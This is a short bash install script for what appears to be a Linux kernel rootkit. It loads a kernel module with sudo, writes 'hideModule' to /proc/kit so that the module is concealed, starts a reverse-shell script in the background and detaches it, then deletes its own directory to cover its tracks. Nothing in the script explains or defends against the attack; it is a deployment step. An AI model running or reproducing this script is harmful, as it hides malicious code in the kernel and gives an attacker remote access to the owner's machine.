#!/bin/bash

directory=`dirname "$0"`
cd "$directory"

ls | egrep -v "(\.ko|\.sh|fromBash|toBash|fromBashStderr)"  && exit #TODO: print a message e.g. won't delete unexpected files


sudo insmod blank.ko &&
echo "hideModule" > /proc/kit &&
./reverseShell.sh & disown


echo "waiting"
sleep 1 #TODO: check reverse shell finished

#install.sh reverseShell.sh  blank.ko


cd "../" && rm -r "$directory"
